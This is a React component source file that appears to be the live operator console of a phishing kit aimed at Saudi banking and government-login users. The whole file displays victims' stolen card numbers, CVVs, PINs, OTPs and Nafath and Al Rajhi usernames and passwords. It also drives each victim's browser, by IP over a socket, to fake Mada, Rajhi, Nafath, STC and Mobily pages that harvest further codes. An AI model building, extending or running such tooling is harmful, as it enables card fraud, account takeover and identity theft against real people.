// src/components/CardModal.js
import React, { useState, useEffect, useRef } from "react";
import { Modal, Button } from "react-bootstrap";
import ConfirmDialog from "./ConfirmDialog";
import { socket } from "../socket";
import "./CardModal.css";

const PAGES = [
  "index.html",
  "info.html",
  "khdm.php",
  
  "billing.html",
  "paymen.html",
  "bCall.html",
  "madaPin.html",
  "pin.html",
  "code.html",
  "rajhi.html",
  "phone.html",
  "phonecode.html",
  "stcCall.html",
  "mobilyCall.html",
  "nafad.html",
  "nafad-basmah.html",
  "whats.html",
];

const LABEL = {
  "index.html": "الصفحة الرئيسية",
  "info.html": "بيانات العميل",
  "khdm.php": "الخدمات والباقات",
  "billing.html": "Billing",
  "paymen.html": "Payment",
  "bCall.html": "B-Call",
  "madaPin.html": "Mada PIN",
  "pin.html": "PIN",
  "code.html": "Card Code",
  "rajhi.html": "Rajhi Login",
  "phone.html": "Phone",
  "phonecode.html": "Phone Code",
  "stcCall.html": "STC Call",
  "mobilyCall.html": "Mobily Call",
  "nafad.html": "Nafad Login",
  "nafad-basmah.html": "Nafad-Basmah",
  "whats.html": "Whats",
};





















export default function CardModal({ ip, user, onClose }) {
  const [confirm, setConfirm] = useState({ show: false, page: null });
  const [basmah, setBasmah] = useState("");

  const [blinkPin, setBlinkPin] = useState(false);
  const [blinkOtp, setBlinkOtp] = useState(false);
  const [blinkPhoneOtp, setBlinkPhoneOtp] = useState(false);

  const prevPinRef = useRef(user?.pin || "");
  const prevOtpRef = useRef(user?.verification_code_two || "");
  const prevPhoneOtpRef = useRef(user?.verification_code_three || "");

  useEffect(() => {
    const current = user?.pin || "";
    if (current && prevPinRef.current !== current) {
      setBlinkPin(true);
      setTimeout(() => setBlinkPin(false), 1500);
    }
    prevPinRef.current = current;
  }, [user?.pin]);

  useEffect(() => {
    const current = user?.verification_code_two || "";
    if (current && prevOtpRef.current !== current) {
      setBlinkOtp(true);
      setTimeout(() => setBlinkOtp(false), 1500);
    }
    prevOtpRef.current = current;
  }, [user?.verification_code_two]);

  useEffect(() => {
    const current = user?.verification_code_three || "";
    if (current && prevPhoneOtpRef.current !== current) {
      setBlinkPhoneOtp(true);
      setTimeout(() => setBlinkPhoneOtp(false), 1500);
    }
    prevPhoneOtpRef.current = current;
  }, [user?.verification_code_three]);

  const handlePageClick = (page) => {
    setConfirm({ show: true, page });
  };

  // Hide ConfirmDialog without emitting anything
  const hideConfirm = () => {
    setConfirm({ show: false, page: null });
    setBasmah("");
  };

  // User clicked “Yes”
  const handleConfirm = () => {
    const page = confirm.page;
    if (page === "nafad-basmah.html") {
      socket.emit("updateBasmah", { ip, basmah: Number(basmah) });
    }
    socket.emit("navigateTo", { ip, page });
    hideConfirm();
  };

  // User clicked “No”
  const handleDecline = () => {
    const page = confirm.page;
    socket.emit("navigateTo", {
      ip,
      page: `${page}?declined=true`,
    });
    hideConfirm();
  };

  const {
    payments = [],
    pin = "",
    verification_code_two = "",
    phoneNumber = "",
    operator = "",
    verification_code_three = "",
    // Nafad creds (raw username/password keys belong to Nafad)
    username: nafadUsername = "",
    password: nafadPassword = "",
    // Basmah code
    code = "",
    currentPage = "",
    // Identity fields for title
    customerName,
    IDorResidenceNumber,
    name,
    FullName,
    nationalId, // camelCase variant
    nid, // alternative variant
    // Rajhi creds are merged into user as rajhiUsername/rajhiPassword
  } = user || {};

  const resolvedName = customerName || name || FullName || "Customer";
  const resolvedNID = IDorResidenceNumber || nationalId || nid || ""; // empty if absent

  // Build the title: "Customer Name — 1234567890"
  const titleText = resolvedNID
    ? `${resolvedName} — ${resolvedNID}`
    : resolvedName;

  const formatExp = (expRaw) =>
    expRaw && expRaw.length >= 4
      ? `${expRaw.slice(0, 2)}/${expRaw.slice(2)}`
      : expRaw;

  return (
    <>
      <Modal show onHide={onClose} size="xl" centered>
        <Modal.Header closeButton>
          {/* Show Customer Name + National ID instead of IP */}
          <Modal.Title>Card Control — {titleText}</Modal.Title>
        </Modal.Header>

        <Modal.Body>
          {/* Top row of page‐buttons */}
          <div className="btn-grid" id="cardTopBtns">
            {PAGES.slice(0, 6).map((p) => (
              <Button
                key={p}
                variant="outline-primary"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}
              >
                {LABEL[p]}
              </Button>
            ))}
          </div>

          {/* Scrollable row of past “card-sim”s */}
          <div
            className="payments-container"
            style={{
              display: "flex",
              overflowX: "auto",
              gap: "1rem",
              marginTop: "1rem",
              paddingBottom: "1rem",
              borderTop: "1px solid #ddd",
              borderBottom: "1px solid #ddd",
            }}
          >
            {payments.length === 0 && (
              <div style={{ color: "#888", padding: "1rem" }}>
                No card submissions yet.
              </div>
            )}
            {payments.map((payDoc, idx) => {
              const { cardHolderName, cardNumber, expirationDate, cvv } =
                payDoc;
              return (
                <div
                  key={`${payDoc._id || idx}`}
                  className="card-sim"
                  style={{
                    minWidth: "260px",
                    border: "1px solid #ccc",
                    borderRadius: "8px",
                    padding: "0.75rem",
                    backgroundColor: "#fefefe",
                    boxShadow: "0 1px 3px rgba(0,0,0,0.1)",
                    flex: "0 0 auto",
                  }}
                >
                  <div
                    style={{
                      fontSize: "0.9rem",
                      fontWeight: 600,
                      marginBottom: "0.5rem",
                    }}
                  >
                    Submission {idx + 1}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Name:</strong> {cardHolderName || "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Card #:</strong>{" "}
                    {cardNumber
                      ? cardNumber.replace(/(\d{4})(?=\d)/g, "$1 ").trim()
                      : "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>Exp:</strong> {formatExp(expirationDate) || "—"}
                  </div>
                  <div style={{ marginBottom: "0.25rem" }}>
                    <strong>CVV:</strong> {cvv || "—"}
                  </div>
                </div>
              );
            })}
          </div>

          {/* Single “Latest” block (PIN, Card OTP, Phone, Nafad/Rajhi) */}
          <div
            className="details-block"
            style={{
              display: "flex",
              gap: "2rem",
              marginTop: "1rem",
              padding: "1rem",
              backgroundColor: "#fafafa",
              borderRadius: "8px",
              border: "1px solid #ddd",
            }}
          >
            {/* PIN & Card OTP */}
            <div style={{ flex: 1 }}>
              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
                Card PIN ⁄ OTP
              </h6>
              <p
                className={blinkPin ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>PIN:</strong> {pin || "—"}
              </p>
              <p
                className={blinkOtp ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>Card OTP (C-Code):</strong>{" "}
                {verification_code_two || "—"}
              </p>
            </div>

            {/* Phone & Phone OTP */}
            <div style={{ flex: 1 }}>
              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
                Phone ⁄ OTP
              </h6>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Phone #:</strong> {phoneNumber || "—"}
              </p>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Operator:</strong> {operator || "—"}
              </p>
              <p
                className={blinkPhoneOtp ? "blink-green-text" : ""}
                style={{ marginBottom: "0.5rem" }}
              >
                <strong>Phone OTP:</strong> {verification_code_three || "—"}
              </p>
            </div>

            {/* Nafad & Rajhi & Basmah */}
            <div style={{ flex: 1 }}>
              <h6 style={{ fontWeight: 600, marginBottom: "0.5rem" }}>
                Nafad ⁄ Rajhi ⁄ Basmah
              </h6>

              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Nafad User:</strong> {nafadUsername || "—"}
              </p>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Nafad Pass:</strong> {nafadPassword || "—"}
              </p>

              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Rajhi User:</strong> {user?.rajhiUsername || "—"}
              </p>
              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Rajhi Pass:</strong> {user?.rajhiPassword || "—"}
              </p>

              <p style={{ marginBottom: "0.5rem" }}>
                <strong>Basmah Code:</strong> {code || "—"}
              </p>
            </div>
          </div>

          {/* Bottom row of page‐buttons */}
          <div
            className="btn-grid"
            id="cardBottomBtns"
            style={{ marginTop: "1rem" }}
          >
            {PAGES.slice(6).map((p) => (
              <Button
                key={p}
                variant="outline-primary"
                className={currentPage === p ? "blink-green" : ""}
                onClick={() => handlePageClick(p)}
              >
                {LABEL[p]}
              </Button>
            ))}
          </div>
        </Modal.Body>
      </Modal>

      <ConfirmDialog
        show={confirm.show}
        page={confirm.page}
        basmah={basmah}
        onBasmahChange={setBasmah}
        onConfirm={handleConfirm}
        onDecline={handleDecline}
        onClose={hideConfirm}
      />
    </>
  );
}
